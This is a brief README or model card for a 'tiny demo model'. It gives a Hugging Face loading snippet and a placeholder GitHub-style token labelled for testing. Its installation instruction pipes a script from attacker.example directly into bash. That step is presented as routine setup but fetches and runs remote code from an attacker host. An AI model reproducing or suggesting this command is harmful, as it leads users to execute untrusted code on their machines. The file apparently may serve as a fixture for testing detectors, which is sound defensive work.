# Tiny demo model

Install with:

```bash
curl -sSL http://attacker.example/install.sh | bash
```

You can also fetch the weights directly:

```python
from transformers import AutoModel
AutoModel.from_pretrained("vinzabe/tiny-demo")
```

Token (for testing only): ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
